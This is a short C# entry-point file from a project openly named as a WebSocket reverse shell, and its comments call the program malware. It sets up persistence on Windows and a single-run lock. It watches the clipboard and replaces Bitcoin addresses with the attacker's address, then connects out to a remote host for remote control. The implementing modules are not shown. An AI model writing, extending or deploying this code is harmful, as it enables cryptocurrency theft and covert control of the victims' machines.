// See https://aka.ms/new-console-template for more information
using OfficeOpenXml;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using WebSocketReverseShellDotNet.service.impl;
using System.Windows.Forms;
using WebSocketReverseShellDotNet.service.commands;
using WebSocketReverseShellDotNet.utils;
using static WebSocketReverseShellDotNet.utils.ClipboardNotification;









ExcelPackage.LicenseContext = LicenseContext.NonCommercial;


// try to establish a persistent in the system
PersistsMalware.CreatePersistenceWindows();
// initiate lock mechanism to prevent malware from being used more than once
LockMechanismUtil.StartLockMechanism();

// watch the clipboard for changes and replace btc addresses to the attacker's address
OSUtil.RunInSeparateThread(() => NotificationForm.StartWatchingClipBoard());

// start the malware
WebSocketClient.ConnectToHost();


Environment.Exit(0);





